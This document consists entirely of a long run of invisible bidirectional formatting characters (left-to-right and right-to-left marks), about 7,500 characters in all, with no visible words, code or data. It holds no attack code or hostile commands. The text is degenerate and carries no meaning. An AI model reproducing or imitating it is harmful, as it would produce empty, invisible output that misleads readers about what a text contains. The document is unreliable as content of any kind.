‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎